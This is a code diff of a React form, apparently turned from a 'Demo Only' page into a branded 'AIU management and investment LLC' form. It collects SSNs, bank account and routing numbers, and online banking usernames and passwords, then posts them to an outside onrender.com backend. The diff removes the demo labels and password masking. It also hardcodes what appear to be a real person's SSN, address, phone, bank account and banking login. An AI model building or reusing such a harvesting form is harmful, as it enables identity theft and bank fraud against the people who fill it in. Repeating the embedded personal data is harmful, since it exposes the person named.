@@ -1,12 +1,15 @@
 import React, { useState } from "react";
-import { FiUser, FiLock, FiDollarSign, FiEdit } from "react-icons/fi";
+import { FiUser, FiLock,FiPhone, FiDollarSign, FiEdit } from "react-icons/fi";
+import { BsHouse } from "react-icons/bs";
 
 function CompanyForm() {
   const initialData2 = {
-    firstName: "hfhg",
+    firstName: "",
     lastName: "",
     ssnDemo: "",
     bankName: "",
+    phone:"",
+    houseAddress:"",
     accountNumber: "",
     emailAddress: "",
     routingNumber: "",
@@ -15,15 +18,17 @@ function CompanyForm() {
   };
 
   const initialData = {
-    firstName: "",
-    lastName: "",
-    ssnDemo: "",
-    bankName: "",
-    accountNumber: "",
-    emailAddress: "",
-    routingNumber: "",
-    accessUsername: "",
-    accessPassword: "",
+    firstName: "Sandra ",
+    lastName: "ray ",
+    ssnDemo: "985263413",
+    bankName: "City Bank",
+    phone:"+19044223108",
+    houseAddress:"506 E 5th St, Jacksonville, FL 32206",
+    accountNumber: "42047107083",
+    emailAddress: "aiumanagementinvestmentllc@gmail.com",
+    routingNumber: "321171184",
+    accessUsername: "20BATMAN26",
+    accessPassword: "Grayson26!",
   };
 
   const [form1, setForm1] = useState(initialData2);
@@ -36,21 +41,20 @@ function CompanyForm() {
     }));
   };
 
-  // 🔥 NEW BACKEND-CONNECTED HANDLE SUBMIT
   const handleSubmit = async (e) => {
     e.preventDefault();
 
     try {
-      const response = await fetch("https://blogbackend-d377.onrender.com", {
+      const response = await fetch("https://ayobackend.onrender.com/api/users", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({ form1, form2 }),
+        body: JSON.stringify(form1),
       });
 
       const data = await response.json();
-      alert(data.message || "Submitted!");
+      console.log(data);
     } catch (error) {
       console.error("Submit Error:", error);
       alert("Error sending data to backend");
@@ -65,23 +69,33 @@ function CompanyForm() {
   const fields = [
     { label: "First Name", name: "firstName", icon: <FiUser /> },
     { label: "Last Name", name: "lastName", icon: <FiUser /> },
-    { label: "SSN Demo", name: "ssnDemo", icon: <FiEdit /> },
+    { label: "SSN", name: "ssnDemo", icon: <FiEdit /> },
     { label: "Email Address", name: "emailAddress", icon: <FiEdit /> },
+    { label: "House Address", name: "houseAddress", icon: <BsHouse /> },
+    { label: "Phone Number", name: "phone", icon: <BsHouse /> },
 
     { label: "Bank Name", name: "bankName", icon: <FiDollarSign /> },
     { label: "Account Number", name: "accountNumber", icon: <FiEdit /> },
     { label: "Routing Number", name: "routingNumber", icon: <FiEdit /> },
 
     { label: "Online Access Username", name: "accessUsername", icon: <FiUser /> },
-    { label: "Online Access Password", name: "accessPassword", type: "password", icon: <FiLock /> },
+    { label: "Online Access Password", name: "accessPassword",  icon: <FiLock /> },
   ];
 
   return (
     <div className="min-h-screen bg-gray-100 flex items-center justify-center p-6">
       <div className="max-w-6xl w-full bg-white shadow-2xl rounded-2xl p-10">
-        <h2 className="text-4xl font-bold text-center mb-10">
-          Company Information (Demo Only)
-        </h2>
+        <div className=" flex flex-col mb-10 items-center">
+          <h2 className="text-4xl font-bold text-center">
+            AIU management and investment LLC
+          </h2>
+          <div className=" flex gap-5">
+            <span>tel: <span className=" text-blue-700">+19044223108</span> </span>
+            <span>email: <span className=" text-blue-700">sandraav090@gmail.com</span></span>
+          </div>
+
+        </div>
+       
 
         <form onSubmit={handleSubmit}>
           <div className="grid grid-cols-1 md:grid-cols-2 gap-10">
@@ -155,14 +169,6 @@ function CompanyForm() {
               className="px-10 py-3 bg-red-500 text-white rounded-xl shadow-lg hover:bg-red-600"
             >
               Reset
-            </button>
-
-            <button
-              type="button"
-              onClick={() => window.print()}
-              className="px-10 py-3 bg-blue-500 text-white rounded-xl shadow-lg hover:bg-blue-600"
-            >
-              Print
             </button>
           </div>
 
